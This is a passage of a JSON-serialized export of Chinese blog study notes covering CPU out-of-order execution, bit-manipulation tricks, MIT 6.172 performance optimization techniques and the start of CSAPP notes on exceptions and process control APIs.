WAW：前后两个指令都写了同一个寄存器\r\n\r\n其中后两者数据冒险在传统的流水线架构中不会发生，但是在乱序执行的过程中，前一条指令先执行还是后一条指令先执行就会带来不同的影响。\r\n\r\n现代处理器将借助 Renaming Table 、Reorder Buffer（ROB）和 Reservation Station（RS）使得乱序执行正常进行。\r\n\r\n处理器内部其实有很多物理寄存器。而对于一个逻辑寄存器（指令中使用的，如 `%rax` 这些）并不是直接对应于一个物理寄存器的。物理寄存器通常比逻辑寄存器多的多，逻辑寄存器到物理寄存器的映射关系也不是固定不变的，而是可以根据 Renaming Table 动态调整的。\r\n\r\n然后考虑如下的例子：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/15/68c6e9083062e.png)\r\n\r\nCPU 取出一个指令之后，将会将指令加入 ROB 和 RS 中。在 ROB 中，每个指令都会有一个 tag 进行标识。我们假定上图中指令 1 和指令 2 正在执行，执行的结果逻辑上应该是分别存放到 `%xmm0` 和 `%xmm2` 中，但 ROB 还记录其实际被存放到物理寄存器 7 和 2 中。而由于现在还没执行完毕，我们在 Renaming Table 中记录一下后续的 `%xmm0` 和 `%xmm2` 将分别来自指令 1 和指令 2 的结果。\r\n\r\n![](http://pic.caiwen.work/i/2025/09/15/68c6ec4922cf6.png)\r\n\r\n再取出指令 3 后，将在 ROB 中记录其需要的操作数，也就是 `%xmm0` 和 `%xmm1`，在 Renaming Table 中被映射为 `t1` 和 `t2`。指令也被送往 RS，但是指令并不会立刻发射，因为指令 1 和 2 没有执行完毕，其所依赖的操作数没有准备就绪。这条指令只能停留在 RS 里等待发射。RS 还没开始执行，所以我们也不去考虑其运算结果存放到哪个物理寄存器中。由于指令 3 会更新 `%xmm2` 寄存器，所以相应的修改 Renaming Table 中 `%xmm2` 指向指令 3 的运算结果。\r\n\r\n然后是取出第四条指令：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/15/68c6eca92baa9.png)\r\n\r\n![](http://pic.caiwen.work/i/2025/09/15/68c6ecd4038a6.png)\r\n\r\n此时指令 1 执行完毕了，结果已经存到了物理寄存器 7 中，所以可以把所有的 `t1` 替换成 `Preg7`：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/15/68c6ed241a3f8.png)\r\n\r\n此时我们发现，指令 4 的所有操作数都已经被放入一个物理寄存器中了，这说明操作数已经准备就绪，指令 4 可以开始执行。指令 4 将会从 RS 中发射到相应的计算单元。我们发现，指令 3 还没准备好执行，指令 4 可以先于指令 3 执行，体现出乱序执行。\r\n\r\n当指令 4 开始执行前，我们可以从物理寄存器的空闲列表中分配一个物理寄存器给指令 4 ，表示指令 4 的运算结果应该放入这个物理寄存器中。\r\n\r\n## 3. Superscalar Processing\r\n\r\n传统的流水线寄存器，一个时钟周期只能发射一个指令。而对于现代寄存器，我们可以考虑，如果 RS 中多个指令的操作数都准备就绪了，那么可以直接全部发射出去，这就实现了一个周期发射多条指令。\r\n\r\n同时，现代 CPU 往往有多个运算单元，同一种类的运算单元也可能有多个，因此可以同时处理多个发射出去的指令。\r\n\r\n![](http://pic.caiwen.work/i/2025/09/15/68c6ef0ce7854.png)\n","summary":"本文介绍了向量硬件中的SSE和AVX指令集，以及现代CPU的乱序执行和超标量处理机制，包括寄存器映射、数据冒险和并行指令发射等核心概念。","key":["mit6.172","软件性能工程","体系架构","cpu"],"tags":[],"path":["os","软件性能工程","软件性能工程-现代处理器架构.md"],"background":"http://pic.caiwen.work/i/2025/09/14/68c6e0485b556.png","recommend":false,"status":"published"},{"type":"Article","title":"软件性能工程-位运算","id":"mit6172-2","createTime":"2025-09-13T09:07:00.000Z","updateTime":"2025-09-14T15:30:40.851Z","content":"\r\n## 1. 位运算\r\n\r\n一些位运算技巧\r\n\r\n### 1.1 补码取反的关系\r\n\r\n`x + ~x = -1`（因为自身加上对自身取反的话，那么二进制所有位都变成 1 了，按补码规则表示为 -1）\r\n\r\n于是我们有 `-x = ~x + 1`\r\n\r\n### 1.2 设置位\r\n\r\n设置第 `k` 位：`y = x | (1 << k)`\r\n\r\n清除第 `k` 位：`y = x & ~(1 << k)`\r\n\r\n切换第 `k` 位：`y = x ^ (1 << k)`\r\n\r\n### 1.3 交换数字\r\n\r\n```c\r\nx = x ^ y; // 此时 x 相当于把原来的两个数字合在了一起\r\ny = x ^ y; // 合在一起之后异或 y 就相当于把 y 消掉，取出 x\r\nx = x ^ y; // 同上\r\n```\r\n\r\n不过这个技巧未必性能更优。因为上面三个操作之间有严重的数据依赖，导致指令的并行性很差。对比传统的引入临时变量来交换：\r\n\r\n```c\r\ntemp = x;\r\nx = y;\r\ny = temp;\r\n```\r\n\r\nCPU 可以同时取出 `x` 和 `y` 然后并行地执行前两个操作。朴素的做法指令的并行性更好。\r\n\r\n### 1.4 取 min\r\n\r\n`r = min(x, y) = y ^ ((x ^ y) & -(x < y))`\r\n\r\n如果 `x < y` ，那么 `-(x < y)` 为 -1，二进制下全 1，使得最后结果为 `(y ^ (x ^ y)) = x`。而如果 `x >= y` 的话后面那堆东西就为 0。\r\n\r\n相比于朴素做法，直接通过判断取 min 的话，分支预测错误的代价比较大。不过也不好说，因为编译器应该会使用条件传送吧（）\r\n\r\n### 1.5 加法取模\r\n\r\n```c\r\nz = x + y;\r\nr = z - (n & -(z >= n));\r\n// 第二行等价于 r = (z < n) ? z : z - n; 这里使用了类似取 min 的技巧\r\n```\r\n\r\n### 1.6 向上取整到 2 的幂次\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c53be508b6d.png)\r\n\r\n其大概思想就是将 `n - 1` 中的所有二进制位都向后覆盖，最后低位都是 `1`，再加一个 `1` 就变为 2 的幂次了：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c53c3b0c42d.png)\r\n\r\n其中 `-1` 是为了处理 `n` 已经是 2 的幂次的情况。\r\n\r\n### 1.7 lowbit\r\n\r\n`r = x & (-x);`\r\n\r\n树状数组学过，这里再复习一下：\r\n\r\n这里的 `-x` 为 `~x + 1`，其中对 `x` 取反之后，原来的 lowbit 就变为 0，而 lowbit 之前的位全变为了 1，此时我们直接再 `+ 1`，lowbit 之前的位全部进 1，使得 `lowbit` 又变为 `1` 了，而 `lowbit` 之后的位仍然不变，这使得再按位与的时候后面都是 0。\r\n\r\n### 1.8 对 2 的幂次取 log\r\n\r\n这里的取 log 的底数是 2，也就是我们想知道一个 2 的幂次的指数。\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c53d7a6809a.png)\r\n\r\n原理是 deBruijn 序列。这种序列满足，序列中任意长度为 $k$ 的区间内的位表示的数字都是不同的，比如：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c53dc891533.png)\r\n\r\n其中的 `00011101` 就是一个 deBruijn 序列。我们可以得到一个 `convert` 数组，记录一个二进制下的三位数在上面的第几行出现。\r\n\r\n然后我们考虑，如果我们把这个 deBruijn 序列左移 $x$ 位，然后取出高 $k=3$ 位，就相当于拿到一个特征值，然后此时这个 $x$ 就对应于上图中左边的数字。如果我们不知道 $x$，仅凭特征值和 `convert` 数组仍然可以得知这个 $x$。\r\n\r\n回到最开始的问题，对于 2 的幂次 $n$，我们直接让 deBruijn 乘上这个 $n$，就相当于进行了左移。\r\n\r\n后面我查了一下如何构造 deBruijn 序列，可以使用求欧拉回路的算法。比如我们有如下的图：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c541579e247.png)\r\n\r\n一种欧拉回路是 `01011100` （从点 `00` 出发）。再验证一下，确实是 deBruijn 序列。\r\n\r\n我们现在想要通过一个长度为 $k$ 的区间，在 deBruijn 序列上滑动，得到所有的三位二进制数。当区间向右滑动时，低两位就变成了高两位，得到的新的数字的低两位数字发生了变化。我们将低两位看成是一个状态，对应于图上的点。在当前状态下再追加一个二进制位看成是状态的转移，对应于图上的有向边。然后在图上，点和连出去的边组合在一起就是一个三位的二进制数。如果存在一个回路能把所有的边覆盖，我们也就相当于覆盖了所有的数字，而这就是欧拉回路。\r\n\r\n### 1.9 popcnt\r\n\r\n朴素的做法就是直接逐位枚举统计。\r\n\r\n我们还可以多个位多个位地统计：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c549266cf76.png)\r\n\r\n理论上我们一次统计的位数越多，循环次数越少，速度越快。但是还需要考虑到缓存的影响，`count` 数组越大，其缓存的利用率越小，可能反而增加时间。\r\n\r\n还有一种分治的算法：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c5499f8e564.png)\r\n\r\n大概思想就是，两个两个地计算 1 的数量，然后再四个四个地，再八个八个地：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c549e42e975.png)\r\n\r\n最后算出来的数字就是 1 的数量。这样做是 $O(\\log N)$ 的。\r\n\r\n一些现代的 CPU 内置了 popcnt 的指令。在 GCC 可以直接使用函数 `__builtin_popcount` 。但是这样会使得代码的可移植性变得稍微差一点。\r\n\r\n## 2. 例子\r\n\r\n### 2.1 例：消除不可预测的分支\r\n\r\n归并排序中合并两个已经排好序的序列：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c539e70fe7a.png)\r\n\r\n其中分支 1、2、4 都是可预测的，因为 CPU 可以假定条件永远成立，这样在大多数情况下都是预测正确的，如果预测错误，那么就结束循环，只会错误一次，至少预测永远成立**不劣于**预测永远不成立。而分支 3 无论预测成立还是不成立，似乎没有个轻重，所以是不可预测的。\r\n\r\n通过消除不可预测的分支，我们可以提升性能，我们将代码变为：\r\n\r\n```c\r\nlong cmp = (*A <= *B);\r\nlong min = *B ^ ((*B ^ *A) & (-cmp));\r\n*C++ = min;\r\nA += cmp; na -= cmp;\r\nB += !cmp; nb -= !cmp;\r\n```\r\n\r\n不过实际上这么搞可能未必真的能提升性能，因为编译器可以选用条件传送指令。\r\n\r\n### 2.2 例：八皇后问题\r\n\r\n大意就是在 $8\\times 8$ 的棋盘上放棋子，要求一个棋子所在位置的同一行、同一列、同一对角线上不能有其他棋子。朴素的做法就是 dfs 暴搜，枚举在一行的哪个位置放棋子是合法的，然后再 dfs 下一行，直到 $8$ 行全部搜完。此时一个问题就是怎么比较好地 check 某个位置是否合法。\r\n\r\n我们可以定义 `down` 变量的第 `i` 位表示第 `i` 列是否存在棋子。\r\n\r\n不用记录某一行是否存在棋子，因为我们一行只放一个。\r\n\r\n对角线有两个，一个是横纵坐标之和为定值，一个是横纵坐标之差为定值，可以根据这个来安排二进制位。\n","summary":"本文介绍了位运算的多种技巧，包括补码取反、设置位、交换数字、取最小值、加法取模、向上取整到2的幂次、lowbit、取对数、popcnt等，并举例说明了如何通过位运算优化分支预测和解决八皇后问题。","key":["mit6.172","软件性能工程","优化","卡常","位运算"],"tags":[],"path":["os","软件性能工程","软件性能工程-位运算.md"],"background":"http://pic.caiwen.work/i/2025/09/14/68c6df1ece120.png","recommend":false,"status":"published"},{"type":"Article","title":"软件性能工程-优化技巧","id":"mit6172-1","createTime":"2025-09-12T09:37:00.000Z","updateTime":"2025-10-07T06:23:16.564Z","content":"\r\n\r\n\r\n## 1. Data Structures\r\n\r\n### 1.1 Packing and Encoding\r\n\r\n如果一个数据需要多个部分表示，比如日期需要由年月日三部分组成，一般可能考虑定义三个整数来表示。我们还可以考虑，将三个部分压缩到一个整数中：\r\n\r\n```c\r\ntypedef struct {\r\n    int year: 13;\r\n    int month: 4;\r\n    int day: 5;\r\n} date_t;\r\n```\r\n\r\n其中我们假设 `year` 的值域大小为 $2^{13}$、`month` 值域大小为 $2^4$（足以表示 12 个月），`day` 值域大小为 $2^5$（足以表示 31 天）。这个被称为**位域**语法，编译器将会自动选择一个足够大的整型存储。在访问具体的字段时，编译器将会自动进行位运算，将字段取出。\r\n\r\n将数据放入尽可能少的量中可以减少内存访问次数，从而提高性能。\r\n\r\n### 1.2 Augmentation\r\n\r\n我们可以在数据结构中多记录一些东西来使得操作变快。例如我们有一个链表，现在想在末尾添加一个元素。如果之前已有的元素数量很多，我们要花费很多的时间从前往后一直寻找到最后一个元素，然后再添加元素。\r\n\r\n![](http://pic.caiwen.work/i/2025/09/12/68c3ed2406c02.png)\r\n\r\n我们可以考虑再记录一个 `tail` 指针，指向最后一个元素，这样直接 $O(1)$ 添加元素了：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/12/68c3ed98d87ea.png)\r\n\r\n### 1.3 Precomputing\r\n\r\n预处理在算竞中用烂了，不用多说。\r\n\r\n除了在运行时预处理，还可以直接打表，生成代码，例如：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/12/68c3eedcac61f.png)\r\n\r\n除此之外我还想到了之前在程序设计课上分享的 `constexpr` 来预处理：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/12/68c3eff117cdc.png)\r\n\r\n![](http://pic.caiwen.work/i/2025/09/12/68c3f0232a6b2.png)\r\n\r\n### 1.4 Caching\r\n\r\n如果一个函数值的计算比较耗费时间，那么我们可以把这个函数值缓存：\r\n\r\n```c\r\ninline double hypo(double A, double B) {\r\n    return sqrt(A*A + B*B);\r\n}\r\n```\r\n\r\n写成：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c4d7692dd1e.png)\r\n\r\n当然这个例子不适用，在其他的情况中多缓存几个值应该会好些。\r\n\r\n### 1.5 Sparsity\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c4d8d1ab697.png)\r\n\r\n对于如图所示的矩阵乘法，如果我们直接计算，时间复杂度就是 $O(n^2)$ 的。但我们发现左边这个矩阵有很多地方都是 $0$，$0$ 乘上任何数都是 $0$，我们很多时间都浪费在对 $0$ 进行运算上。\r\n\r\n我们可以将这种矩阵表示成一种 **Compressed Sparsity Row (CSR)** 的形式：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c4da1161e24.png)\r\n\r\n对于每一行，`cols` 数组表示哪一列是非 0 的，`vals` 数组表示这个非 0 的值是多少。然后我们把每一行的 `cols` 和 `vals` 都放在一起，并用 `rows[i]` 表示第 $i$ 行所对应的 `cols` 和 `vals` 的起始位置。\r\n\r\n我们可以在 $O(n^2)$ 的时间内得到一个 $O(n+nnz)$ 的数据结构。其中 $nnz$ 为非 0 元素的个数。\r\n\r\n然后使用下面的算法进行矩阵乘法：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c4dadcd11cd.png)\r\n\r\n时间复杂度为 $O(nnz)$\r\n\r\n对于图，也有对应的手法：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c4deb75af6a.png)\r\n\r\n`edges` 数组存放一个点连出去的边。我个人觉得和直接用 `vector` 建图的差距不大。\r\n\r\n这种图的表示方式还可以再进行压缩，首先每个点对应 `edges` 元素从小到大排序。然后每个点对应的第一个 `edges` 元素减去该点的编号，即 `edges[offsets[v]]-=v`，然后 `edges` 中剩余的元素做差分，即 `edges[offsets[v]+i]-=edges[offsets[v]+i-1]`。这么做的原因是让 `edges` 中元素的绝对值尽可能小，从而使得能用尽可能少的位/字节表示：\r\n\r\n![image-20251007141034163](https://api.file.caiwen.work/picture/2025/10/07/image-20251007141034163.png)\r\n\r\n然后就有两种方案：\r\n\r\n**k-bit codes**\r\n\r\n每个 `edges` 元素的值用若干个 `k` 位数据表示，其中低 `k-1` 位用于编码数据，第 `k` 位为 continue bit，如果其为 1 就说明还没编码完，需要继续往后读 `k` 位。这样的话每个元素所使用的位的数量可能是不一样的。\r\n\r\n这样做有一个问题，我们需要判断第 `k` 位，而这个分支判断是不可预测的，分支预测的开销会比较大。\r\n\r\n**另一个方法**\r\n\r\n[这篇论文](https://ieeexplore.ieee.org/document/7149297) 介绍了不用 continue bit 的方法。首先用一个字节来表示一个 header，header 的高 2 位表示后续每个整数所使用的字节的大小（1 到 4 个字节），然后低 6 位表示后面有几个整数：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/07/image-20251007142313883.png)\r\n\r\n## 2. Logic\r\n\r\n### 2.1 Constant Folding and Propagation\r\n\r\n就是直接传播常量，把能在编译期算出来的东西算出来，没什么好说的。应该是编译器自己能搞定的。\r\n\r\n### 2.2 Common-Subexpression Elimination\r\n\r\n如果有表达式多次出现，那么我们可以只计算一个，不用重复计算。\r\n\r\n```c\r\na = b + c;\r\nb = a - d;\r\nc = b + c;\r\nd = a - d;\r\n```\r\n\r\n可以写为：\r\n\r\n```c\r\na = b + c;\r\nb = a - d;\r\nc = b + c;\r\nd = b;\r\n```\r\n\r\n由于第三行和第一行的 `b` 发生了改变，所以我们不消掉第三行的表达式。\r\n\r\n### 2.3 Algebraic Identities\r\n\r\n我们可以使用一些代数上的变化来使程序变快：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c4e2c762027.png)\r\n\r\n`collides` 中计算 `d` 的时候需要使用 `sqrt` 函数，而这个函数的计算并非是常数的时间，使得 `d` 计算比较慢。但 `d` 后面只是去跟 `b->r + b2->r` 比较，那么我们可以两边平方，不用再使用 `sqrt` 了：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c4e372d3d78.png)\r\n\r\n### 2.4 Short-Circuiting\r\n\r\n有时候我们可能算到一半就知道结果了，后面的计算就没必要了。\r\n\r\n比如判断一个非负数序列之和是否大于某个 `limit`，那么如果在循环累加的时候已经超过 `limit` 就可以直接返回了。\r\n\r\n除此之外，`&&` 和 `||` 有短路特性。在判断的时候，可以把容易成立的条件，或是耗费比较低的条件放在前面：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c4e5b862a64.png)\r\n\r\n一般来说空格和换行符会比较常见，所以后者选择将这两个的判断提前。\r\n\r\n### 2.5 Creating a Fast Path\r\n\r\n在进行比较复杂耗时的判断之前可以先看一下有没有一些简单且耗时短的特殊情况。\r\n\r\n比如判断两球是否相交，一个特殊情况是，如果包裹两个球的正方形没有相交的话那么这两个球就不会相交，而判断正方形相交是简单的。\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c4e639dee90.png)\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c4e69022779.png)\r\n\r\n当然上述代码中的 `b1-> r + b2->r` 还可以用到 2.2 所说的优化，把他们提出来。\r\n\r\n### 2.6 Combining Tests\r\n\r\n比如我们想将下面这个真值表变成函数的话，直接写的话需要各种 if 判断，可能会出现分支预测错误带来的严重的性能下降：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c4e6f2a0c1b.png)\r\n\r\n我们可以把 `a` 、`b` 、`c` 三个参数压成一个整数，然后使用 `switch` 判断：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c4e766b9c92.png)\r\n\r\n## 3. Loops\r\n\r\n### 3.1 Hoisting\r\n\r\n循环内每次循环计算结果都一样的代码可以提出来，不要重复计算：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c4e8351b9ed.png)\r\n\r\n### 3.2 Sentinels\r\n\r\nSentinels 是一种特殊值，放在数据结构中，简化条件判断。比如：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c4e91dca322.png)\r\n\r\n`A` 数组最后的 `INT64_MAX` 和 `1` 可以保证后面的 `while` 循环一定可以退出。后面再判断循环退出的位置，就可以消去新加入的值所带来的影响。并且，前者每次循环需要进行两次判断，而后者只需要进行一次，速度更快。\r\n\r\n### 3.3 Loop Unrolling\r\n\r\n在 CSAPP 中见过且用过，不多说。\r\n\r\n不过这里还有一点值得讨论。如果循环展开过多，会使得循环体内的指令数很多，这样就会使得指令的空间局部性比较差，反而降低性能。\r\n\r\n### 3.4 Loop Fusion\r\n\r\n将能合并在一起的循环合并到一起：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c4eaca47ae1.png)\r\n\r\n### 3.5 Eliminating Wasted Iterations\r\n\r\n我们可以通过调整循环边界来减少不必要的循环：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c4eb2378a11.png)\r\n\r\n## 4. Functions\r\n\r\n### 4.1 Inlining\r\n\r\n函数内联大家都很熟悉了，不多说。\r\n\r\n不过在 C 语言中，有如下的说法：\r\n\r\n如果一个包含函数体的函数定义只有 `inline` 修饰是过不了编译的，因为 `inline` 是**建议**编译器进行内联优化，编译器**不会生成函数的符号**。此时，对于一个函数调用，编译器可以选择内联，但如果编译器不考虑内联的话，会出现链接错误。所以一种方案是写一个带 `inline` 不带函数体的定义和一个不带 `inline` 带函数体的定义：\r\n\r\n```c\r\ninline int func();\r\nint func() {\r\n    ....\r\n}\r\n```\r\n\r\n另一个解决方案是写 `static inline int func() {...}`，多加一个 `static` 修饰，使得即使没内联，每个 `.c` 文件也都生成一个局部的符号，不会有链接冲突。\r\n\r\n为了更严格地控制编译器内联优化的行为，我们有：\r\n\r\n* `__attribute__((always_inline))`：强制编译器去内联函数\r\n* `__attribute__((no_inline))`：强制编译器不去内联函数\r\n\r\n### 4.2 Tail-Recursion Elimination\r\n\r\n这个优化说的是，如果一个递归函数，最后的行为是进行递归（也就是尾递归），那么我们起始可以不去递归，而是复用当前的函数（更改下参数再从头开始跑一遍），这样可以减少函数调用的开销：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c4f173c17e9.png)\r\n\r\n### 4.3 Coarsening Recursion\r\n\r\n众所周知，一些时间复杂度较低的算法，只是在数据量较大时才显出优势。而在低数据量时，时间复杂度高的算法未必比复杂度低的算法更慢。于是我们设置一个临界，在临界以下考虑使用别的算法：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/13/68c4f219b6508.png)\n","summary":"文章介绍了编程优化技巧，涵盖数据结构、逻辑、循环和函数四方面，包括位域、缓存、预处理、循环展开、函数内联等方法，旨在提升代码性能和效率。","key":["mit6.172","软件性能工程","优化","卡常"],"tags":[],"path":["cs","软件性能工程","软件性能工程-优化技巧.md"],"background":"http://pic.caiwen.work/i/2025/09/14/68c6dd779beb8.png","recommend":false,"status":"published"},{"type":"Article","title":"CSAPP第八章 - 异常控制流","id":"csapp-8","createTime":"2025-08-12T06:55:00.000Z","updateTime":"2025-09-05T14:41:54.417Z","content":"\n\n\n\n\n## 异常\n\n系统启动时，操作系统将会分配和初始化一个异常表，将异常表的首地址放到 CPU 的异常表基址寄存器中。处理器触发异常时，会根据异常编号，从异常表上获取到处理程序的地址，并跳转到对应的处理程序：\n\n![](http://pic.caiwen.work/i/2025/08/12/689aea78e0ced.png)\n\n![](http://pic.caiwen.work/i/2025/08/12/689aea513b91f.png)\n\n异常类似于过程调用，但是有如下区别：\n\n- 跳转到处理程序之前，CPU 会将返回地址压入栈中。不过，CPU 会根据异常类型，选择返回地址为当前指令或者是下一条指令。\n- 处理器会把一些额外的处理器状态压入栈中，方便处理程序返回时状态的恢复。\n- 异常处理程序运行在内核模式下。\n\n异常有如下类型：\n\n![](http://pic.caiwen.work/i/2025/08/12/689aebd6627c1.png)\n\n异常号在 $0\\sim 31$ 是 CPU 架构师定义的异常，对于任何的操作系统都是一样的。$32\\sim 255$ 是操作系统自己定义的中断或是陷阱等。\n\n### 中断\n\n中断来自于外部 IO 设备。外部 IO 设备将异常号放到系统总线上，然后向处理器芯片上的一个引脚发送信号，来触发中断。\n\nCPU 执行完当前指令后，如果发现中断引脚电压升高，则从系统总线上读取异常号，并调用对应的处理程序。\n\n### 陷阱/系统调用\n\n处理器提供了一个特殊的 `syscall` 指令，调用后处理器将跳到处理陷阱的处理程序中。\n\n在 Linux 系统中会维护一个跳转表（和异常表不同，跳转表专门用于处理系统调用），根据寄存器中存储的系统调用编号，再跳转到对应的系统调用。\n\n![](http://pic.caiwen.work/i/2025/08/12/689aef2387832.png)\n\nLinux 系统的系统调用的参数一律使用寄存器传递（不通过栈传递）。其中 `%rax` 寄存器要存储系统调用号，寄存器 `%rdi`、`%rsi`、`%rdx`、`%r10`、`%r8`、`%r9` 包含最多 6 个参数，参数一到参数六依次存储在这些寄存器（注意这和正常函数调用的约定不同）。从函数调用返回时，`%rax` 中存储返回值。一般来说返回值为负数的话说明发生了异常，异常编号会存储在一个全局整数变量 `errno` 中，这个变量定义在 `errno.h` 中。\n\n`strerrno` 函数可以获取与某个 `errno` 相关联的错误。我们可以封装一个错误报告函数：\n\n```c\nvoid unix_error(char *msg){\n    fprintf(stderr, \"%s: %s\\n\", msg, strerror(errno));\n    exit(0);\n}\n```\n\n我们最好给每个系统调用函数都包装一个错误处理形式，比如：\n\n```c\npid_t Fork(){\n    pid_t pid;\n    if((pid = fork()) < 0) unix_error(\"Fork error\");\n    return pid;\n}\n```\n\n### 故障\n\n一些可能能被处理程序修正的错误，被称为故障。如果处理程序能够修正这个错误则可以返回到引起故障的指令，并重新执行。否则，处理程序则调用内核的 `abort` 程序，终止引起故障的程序。常见的故障如下：\n\n- 除法错误（异常号：0）：程序试图除以一个 0，或者是除法指令结果对于目标操作数来说太大了，就会触发。尽管 CPU 允许操作系统恢复这种错误，但 Linux 系统不会这么做，而是选择终止程序，并把这种错误报告为 Floating Exception\n- 一般保护故障（异常号：13）：引起这个故障会有许多原因。比较常见的是引用了未定义的虚拟内存区域，或是尝试写一个只读的虚拟内存。Linux 也不会恢复这种错误，并报告为 Segmentation Fault\n- 缺页（异常号：14）\n\n### 终止\n\n一些错误是不可恢复的致命错误，通常是一些硬件错误，比如 DRAM 或是 SRAM 存储的数据被损坏，奇偶校验错误。CPU 不希望处理程序返回到原来的程序中，因此对应的处理程序被触发后应该立刻终止程序。通常触发异常号为 18，描述为“机器检查”的异常。\n\n## 进程\n\n### 获取进程 pid\n\n`pid_t getpid(void);`\n\n- 定义在 `unistd.h` 中，其中 `pid_t` 在 `sys/types.h` 中，其实是 `int` 类型。\n- 返回当前进程的 pid。\n\n`pid_t getppid(void);`\n\n- 定义在 `unistd.h` 中。\n- 返回当前进程的父进程的 pid。\n\n### 创建进程\n\n`pid_t fork(void);`\n\n- 定义在 `unistd.h` 中。\n- 子进程返回 0，父进程返回子进程的 pid。如果出错，则返回 -1。\n\n`int execve(const char *filename, const char *argv[], const char *envp[]);`\n\n- 定义在 `unistd.h` 中。\n\n- 在当前进程的上下文中加载并运行一个程序。注意，加载后当前进程的文件描述符，信号阻塞状态等仍然和之前一样。\n- `argv` 指向一个指针数组，这个数组里每个元素都指向一个参数的字符串。数组的末尾要以空指针结尾。按照管理，`argv[0]` 指向的字符串应该和 `filename` 一致。\n- `envp` 和 `argv` 类似，不同的是指向的字符串应该是形如 `name=value` 形式的键值对，作为环境变量。\n- `argv` 和 `envp` 对应于 `main` 函数的完整原型： `int main(int argc, char *argv[], char *envp[]);`\n- 如果成功则不返回了。返回了说明发生错误，返回 -1。\n\n### 退出 / 回收进程\n\n`void exit(int status);`\n\n- 定义在 `stdlib.h` 中。\n- 以 `status` 为退出状态来终止进程。\n\n`pid_t waitpid(pid_t pid, int *statusp, int options);`\n\n- 当进程终止时，内核并不会立刻将其从系统中清除。进程会回收大部分资源，但还有一部分资源没被回收，等待其父进程回收。如果父进程终止了，其子进程会称为 init 进程的子进程。init 进程是系统启动的时候创建的，不会被终止，是所有进程的祖先。\n- 定义在 `sys/wait.h` 中。\n- 默认情况下（`options` 为 0 时），`waitpid` 挂起当前进程，直到它的等待集合中的一个进程被终止，则返回。此时这个终止的进程的资源就被当前进程完全回收了。\n- `pid` 来确定等待集合：\n  - `pid` > 0 ，那么等待集合就是一个单独的 pid 为 `pid` 的子进程。\n  - `pid` = -1，那么等待集合就是全部的子进程。\n- `options` 可选如下参数：\n  - `WNOHANG`：如果等待集合中任何子进程都没被终止，不挂起，立即返回。\n  - `WUNTRACED`：不仅检查进程是否被终止，如果子进程被停止，也返回。\n  - `WCONTINUED`：不仅检查进程是否被终止，如果一个被停止的进程因为受到 `SIGCONT` 信号重新开始执行，也返回。\n- `waitpid` 会在 `statusp` 指向的地址上存放子进程的状态。有如下的宏用来解释状态的信息：\n  - `WIFEXITED(status)`：如果子进程是由于 `exit` 或者 `main` 函数返回而正常终止的，则返回真。\n  - `WEXITSTATUS(status)`：获取正常终止的子进程的退出状态。`WIFEXITED(status)` 为真时才可以获取。\n  - `WIFSIGNALED(status)`：如果子进程是因为一个未被捕获的信号终止的，那么就返回真。\n  - `WTERMSIG(status)`：返回导致子进程终止的信号的编号。`WIFSIGNALED(status)` 为真时才可以获取。\n  - `WIFSTOPPED(status)`：如果子进程是停止而导致 `waitpid` 返回的，则返回真。\n  - `WSTOPSIG(status)`：返回引起子进程停止的信号的编号。`WIFSTOPPED(status)` 为真时才可以获取。\n  - `WIFCONTINUED(status)`：如果子进程是收到 `SIGCONT` 信号重新启动而导致 `waitpid` 返回的，则返回真。\n- 如果成功，则返回引起返回的子进程的 pid。如果设置了 `WNOHANG` 且没有引发返回的子进程，则返回 0。如果是其他错误，则返回 -1，并设置 `errno`。\n- 会设置的 `errno` 如下：\n  - `ECHILD`：当前进程没有子进程。准确来说这不算什么严重错误，应该特判一下。\n  - `EINTR`：当前进程由于 `waitpid` 被挂起的过程中，又被一个信号中断了。\n\n`pid_t wait(int *statusp);`\n\n- 定义在 `sys/wait.h` 中。\n- 调用 `wait(&status)` 等价于调用 `waitpid(-1, &status, 0)`\n\n### 进程休眠\n\n`unsigned int sleep(unsigned int secs);`\n\n- 定义在 `unistd.h` 中。\n- 将一个进程挂起一段指定时间。\n- 函数返回还要休眠的秒数。\n  - 如果等待的时间已经到了，那么函数就返回 0。\n  - 如果 `sleep` 函数被一个信号中断而过早返回，那么就返回非 0 的值。\n\n`int pause(void);`\n\n- 定义在 `unistd.h` 中。\n- 让函数休眠，直到当前进程受到一个信号（任何没有被阻塞且没有被忽略的信号都可以）\n- 总是返回 -1\n\n### 环境变量\n\n`char *getenv(const char *name);`\n\n- 定义在 `stdlib.h` 中。\n- 在当前的环境变量数组 `envp` 中寻找 `name=value` 形式的字符串。如果找到了则返回对应的 `value`，反之返回空指针。\n\n`int setenv(const char *name, const char *newvalue, int overwrite);`\n\n- 定义在 `stdlib.h` 中。\n- 将 